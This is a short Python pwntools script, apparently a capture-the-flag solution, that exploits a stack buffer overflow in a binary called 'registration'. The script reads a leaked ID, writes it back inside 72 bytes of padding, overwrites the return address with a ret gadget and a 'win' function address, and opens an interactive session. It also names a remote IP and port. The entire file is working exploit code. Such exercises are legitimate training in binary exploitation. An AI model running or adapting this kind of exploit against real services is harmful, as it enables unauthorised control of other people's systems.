from pwn import *

ip = "140.110.112.77"
port = 6128

context.arch = "amd64"

r = remote(ip, port)
r = process("./registration")

ret = 0x400619
win = 0x4007d6

r.recvuntil(":")
ID = int(r.recvline()[:-1])
log.info(ID)

r.sendlineafter(":", "haha")

payload = b""
payload += flat(b"a" * 60, ID)
payload = payload.ljust(72) + flat(ret, win)

r.sendlineafter(":", payload)

r.interactive()
